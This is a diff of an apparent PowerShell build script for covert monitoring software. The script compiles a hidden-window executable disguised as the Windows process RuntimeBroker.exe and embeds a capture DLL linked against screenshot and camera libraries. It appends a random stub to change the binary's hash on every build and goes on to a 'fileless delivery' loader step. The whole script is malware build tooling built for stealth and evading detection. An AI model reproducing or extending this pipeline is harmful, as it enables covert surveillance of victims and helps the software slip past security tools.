@@ -12,13 +12,25 @@ $buildVersion = [int][double]::Parse((Get-Date -UFormat %s))
 $stubGuid = [System.Guid]::NewGuid().ToString("N")
 Add-Content -Path "monitor.cpp" -Value "int _s$stubGuid(void){return 0;}"
 
-g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res -lwinhttp -lcrypt32 -lgdiplus -lole32 -loleaut32 -lstrmiids -luuid -lbcrypt -o RuntimeBroker.exe
-if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }
+g++ -static -Os -s -shared capture_dll.cpp -lole32 -loleaut32 -lstrmiids -luuid -lgdiplus -lgdi32 -o capture_dll.dll
+if (!$?) { Write-Output "DLL compilation failed"; exit 1 }
 
-# Revert the stub
-git checkout -- monitor.cpp
+windres capture_dll.rc -O coff -o capture_dll.res
+if (!$?) { Write-Output "DLL resource compilation failed"; exit 1 }
 
-# Remove-Item -Force version.res -ErrorAction SilentlyContinue
+g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res capture_dll.res -lwinhttp -lcrypt32 -lgdiplus -lole32 -loleaut32 -lstrmiids -luuid -lbcrypt -o RuntimeBroker.exe
+if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Remove-Item -Force capture_dll.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }
+
+# Remove the random stub we appended (instead of git checkout which reverts all changes)
+$mc = Get-Content -Path "monitor.cpp"
+if ($mc.Count -gt 0 -and $mc[-1] -match '^int _s[0-9a-f]+\(void\)\{return 0;\}$') {
+    $mc = $mc[0..($mc.Count - 2)]
+    Set-Content -Path "monitor.cpp" -Value $mc
+}
+
+Remove-Item -Force version.res -ErrorAction SilentlyContinue
+Remove-Item -Force capture_dll.res -ErrorAction SilentlyContinue
+Remove-Item -Force capture_dll.dll -ErrorAction SilentlyContinue
 # upx --ultra-brute RuntimeBroker.exe
 
 # Generate loader.ps1 (fileless delivery)
